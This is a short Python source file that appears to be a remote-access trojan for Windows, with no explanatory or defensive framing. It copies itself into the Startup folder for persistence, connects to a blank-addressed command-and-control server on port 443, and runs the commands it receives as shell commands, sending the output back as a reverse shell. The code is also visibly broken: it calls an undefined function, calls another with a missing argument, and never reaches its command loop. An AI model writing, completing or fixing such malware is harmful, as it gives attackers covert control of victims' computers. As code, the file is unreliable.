import os
import time
import socket
import threading
import subprocess

# Server IP
CCIP = ""
CCPORT = 443

def autorun():
    filename = os.path.basename(__file__)
    exe_file = filename.replace(".py",".exe")
    os.system("copy {} \"\APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))


def connect(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)

def cli(client, data):
    try:
        proc = subprocess.Popen(data, shell = True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()

        client.send(output + b"\n")
    except Exception as error:
        print(error)

def target(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()

            if data == "/:kill":
                return 
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__":
    autorun()

    while True:
        client = connect(CCIP, CCPORT)

        if client:
            cli(client)
        else:
            time.sleep(3)










